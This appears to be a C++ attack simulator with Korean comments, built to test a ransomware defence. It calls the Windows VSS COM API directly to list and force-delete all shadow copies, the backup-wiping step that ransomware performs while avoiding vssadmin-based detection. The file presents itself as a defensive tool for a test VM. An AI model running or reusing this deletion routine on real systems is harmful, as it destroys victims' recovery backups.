// ===========================================================================
// File: VssAttackSim.cpp
// Purpose: RansomGuard 방어 검증용 공격 시뮬레이터
//          랜섬웨어가 vssadmin.exe 를 거치지 않고 VSS COM API 를 직접 호출해
//          섀도 복사본을 삭제하는 행위를 재현한다.
//          → 커널 패스트패스 우회 여부 및 실제 삭제 실행 프로세스를 관찰한다.
//
// [경계] 이 도구는 격리된 테스트 VM 에서 자신의 방어 솔루션을 검증할 목적이다.
//        VSS 삭제 API(합법 백업 SW 도 사용) 호출까지만 수행하며,
//        파일 암호화/확산/은폐 등 실제 랜섬웨어 기능은 포함하지 않는다.
//
// Build : x64, Unicode, Console
// Link  : vssapi.lib, ole32.lib, oleaut32.lib
// Run   : 관리자 권한 필수
//   VssAttackSim.exe            -> enum   (기본, 삭제 안 함)
//   VssAttackSim.exe enum       -> 스냅샷 열거만
//   VssAttackSim.exe delete-one -> 가장 먼저 열거된 1개 삭제
//   VssAttackSim.exe delete-all -> 전체 삭제
// ===========================================================================
#include <windows.h>
#include <objbase.h>
#include <vss.h>
#include <vswriter.h>
#include <vsbackup.h>
#include <cstdio>
#include <cwchar>
#include <string>
#include <vector>

#pragma comment(lib, "vssapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

// ---------------------------------------------------------------------------
// 실행 모드
// ---------------------------------------------------------------------------
enum class Mode {
    Enum,       // 열거만
    DeleteOne,  // 1개 삭제
    DeleteAll   // 전체 삭제
};

// ---------------------------------------------------------------------------
// 유틸: HRESULT 를 읽기 쉽게 출력
// ---------------------------------------------------------------------------
static void PrintStep(const wchar_t* step, HRESULT hr)
{
    if (SUCCEEDED(hr)) {
        wprintf(L"  [OK]   %-32s (hr=0x%08X)\n", step, (unsigned)hr);
    }
    else {
        wprintf(L"  [FAIL] %-32s (hr=0x%08X)\n", step, (unsigned)hr);
    }
}

// VSS_ID(GUID) 를 문자열로
static std::wstring GuidToString(const VSS_ID& id)
{
    wchar_t buf[64] = { 0 };
    StringFromGUID2(id, buf, ARRAYSIZE(buf));
    return std::wstring(buf);
}

// ---------------------------------------------------------------------------
// 명령줄 파싱
// ---------------------------------------------------------------------------
static Mode ParseMode(int argc, wchar_t** argv)
{
    if (argc < 2) return Mode::Enum;

    if (_wcsicmp(argv[1], L"enum") == 0)       return Mode::Enum;
    if (_wcsicmp(argv[1], L"delete-one") == 0) return Mode::DeleteOne;
    if (_wcsicmp(argv[1], L"delete-all") == 0) return Mode::DeleteAll;

    wprintf(L"[!] 알 수 없는 모드 '%s' → enum 으로 진행\n", argv[1]);
    return Mode::Enum;
}

static const wchar_t* ModeName(Mode m)
{
    switch (m) {
    case Mode::Enum:      return L"enum (열거만)";
    case Mode::DeleteOne: return L"delete-one (1개 삭제)";
    case Mode::DeleteAll: return L"delete-all (전체 삭제)";
    }
    return L"unknown";
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------
int wmain(int argc, wchar_t** argv)
{
    Mode mode = ParseMode(argc, argv);

    wprintf(L"===========================================================\n");
    wprintf(L" VssAttackSim  (PID=%lu)\n", GetCurrentProcessId());
    wprintf(L" mode: %s\n", ModeName(mode));
    wprintf(L"===========================================================\n\n");

    HRESULT hr = S_OK;
    IVssBackupComponents* pBackup = nullptr;
    IVssEnumObject* pEnum = nullptr;
    int deleted = 0;

    HMODULE hHook = LoadLibraryW(L"C:\\test\\VssComHook.dll");
    if (hHook) {
        wprintf(L"[+] VssComHook.dll 로드 성공 (0x%p)\n", (void*)hHook);
    }
    else {
        wprintf(L"[!] VssComHook.dll 로드 실패. 에러: %lu\n", GetLastError());
    }

    // -----------------------------------------------------------------------
    // 1) COM 초기화
    // -----------------------------------------------------------------------
    hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    PrintStep(L"CoInitializeEx", hr);
    if (FAILED(hr)) return 1;

    // -----------------------------------------------------------------------
    // 2) COM 보안 초기화
    //    VSS 는 이 호출이 없으면 InitializeForBackup 에서 E_ACCESSDENIED 로 실패한다.
    // -----------------------------------------------------------------------
    hr = CoInitializeSecurity(
        nullptr,                        // 보안 서술자
        -1,                             // 인증 서비스 수 (COM 이 선택)
        nullptr,                        // 인증 서비스 배열
        nullptr,                        // 예약
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,  // 기본 인증 수준
        RPC_C_IMP_LEVEL_IDENTIFY,       // 기본 위장 수준
        nullptr,                        // 인증 정보
        EOAC_NONE,                      // 추가 기능
        nullptr);                       // 예약
    // 이미 초기화됐다면 RPC_E_TOO_LATE — 무시 가능
    if (hr == RPC_E_TOO_LATE) {
        wprintf(L"  [--]   CoInitializeSecurity            (이미 초기화됨, 계속)\n");
        hr = S_OK;
    }
    else {
        PrintStep(L"CoInitializeSecurity", hr);
    }
    if (FAILED(hr)) { CoUninitialize(); return 1; }

    // -----------------------------------------------------------------------
    // 3) 백업 컴포넌트 생성
    //    [관찰 포인트] 이 함수가 곧 방어(VssComHook)의 후킹 대상 후보.
    //    실제 export 는 CreateVssBackupComponentsInternal 이며,
    //    vsbackup.h 의 CreateVssBackupComponents 는 이를 부르는 inline 래퍼다.
    // -----------------------------------------------------------------------
    hr = CreateVssBackupComponents(&pBackup);
    PrintStep(L"CreateVssBackupComponents", hr);
    if (FAILED(hr) || pBackup == nullptr) { CoUninitialize(); return 1; }

    // -----------------------------------------------------------------------
    // 4) 백업 세션 초기화
    // -----------------------------------------------------------------------
    hr = pBackup->InitializeForBackup();
    PrintStep(L"InitializeForBackup", hr);
    if (FAILED(hr)) goto Cleanup;

    // -----------------------------------------------------------------------
    // 5) 컨텍스트 설정 — 모든 섀도 접근
    // -----------------------------------------------------------------------
    hr = pBackup->SetContext(VSS_CTX_ALL);
    PrintStep(L"SetContext(VSS_CTX_ALL)", hr);
    if (FAILED(hr)) goto Cleanup;

    // -----------------------------------------------------------------------
    // 6) 스냅샷 열거
    // -----------------------------------------------------------------------
    hr = pBackup->Query(GUID_NULL,
        VSS_OBJECT_NONE,
        VSS_OBJECT_SNAPSHOT,
        &pEnum);
    PrintStep(L"Query(snapshots)", hr);
    if (FAILED(hr) || pEnum == nullptr) goto Cleanup;

    {
        wprintf(L"\n[스냅샷 목록]\n");

        std::vector<VSS_ID> snapshotIds;
        VSS_OBJECT_PROP prop;
        ULONG fetched = 0;

        while (true) {
            ZeroMemory(&prop, sizeof(prop));
            hr = pEnum->Next(1, &prop, &fetched);
            if (hr != S_OK || fetched == 0) {
                break;  // 더 없음
            }

            if (prop.Type == VSS_OBJECT_SNAPSHOT) {
                VSS_SNAPSHOT_PROP& s = prop.Obj.Snap;

                wprintf(L"  #%zu  Id=%s\n",
                    snapshotIds.size() + 1,
                    GuidToString(s.m_SnapshotId).c_str());
                if (s.m_pwszOriginalVolumeName) {
                    wprintf(L"       Volume: %s\n", s.m_pwszOriginalVolumeName);
                }

                snapshotIds.push_back(s.m_SnapshotId);

                // VSS_SNAPSHOT_PROP 내부 문자열은 호출자가 해제해야 한다.
                VssFreeSnapshotProperties(&s);
            }
        }

        wprintf(L"\n  총 %zu 개 스냅샷 발견\n\n", snapshotIds.size());

        if (snapshotIds.empty()) {
            wprintf(L"[i] 삭제할 스냅샷이 없습니다.\n");
            wprintf(L"    먼저 섀도 복사본을 생성하세요:\n");
            wprintf(L"      wmic shadowcopy call create Volume=C:\\\n");
            goto Cleanup;
        }

        // -------------------------------------------------------------------
        // 7) 모드별 삭제
        // -------------------------------------------------------------------
        if (mode == Mode::Enum) {
            wprintf(L"[enum 모드] 삭제하지 않고 종료합니다.\n");
            goto Cleanup;
        }

        size_t target = (mode == Mode::DeleteOne) ? 1 : snapshotIds.size();
        wprintf(L"[삭제 시도] 대상 %zu 개\n", target);

        for (size_t i = 0; i < target; i++) {
            LONG   deletedCount = 0;
            VSS_ID nonDeleted = GUID_NULL;

            // [관찰 포인트] 실제 파괴 행위.
            //   방어가 붙으면 이 호출이 실패(E_ACCESSDENIED 등)해야 한다.
            HRESULT hrDel = pBackup->DeleteSnapshots(
                snapshotIds[i],
                VSS_OBJECT_SNAPSHOT,
                TRUE,               // bForceDelete
                &deletedCount,
                &nonDeleted);

            if (SUCCEEDED(hrDel)) {
                deleted += deletedCount;
                wprintf(L"  [DELETED] #%zu  (count=%ld)\n", i + 1, deletedCount);
            }
            else {
                wprintf(L"  [BLOCKED/FAIL] #%zu  hr=0x%08X",
                    i + 1, (unsigned)hrDel);
                if (nonDeleted != GUID_NULL) {
                    wprintf(L"  nonDeleted=%s", GuidToString(nonDeleted).c_str());
                }
                wprintf(L"\n");
            }
        }

        wprintf(L"\n[결과] 실제 삭제 %d 개\n", deleted);
    }

Cleanup:
    if (pEnum)   { pEnum->Release();   pEnum = nullptr; }
    if (pBackup) { pBackup->Release(); pBackup = nullptr; }
    CoUninitialize();

    wprintf(L"\n===========================================================\n");
    wprintf(L" 종료. (삭제 %d 개)\n", deleted);
    wprintf(L"===========================================================\n");

    system("pause");   // 콘솔 창이 바로 닫히는 것 방지
    return 0;
}
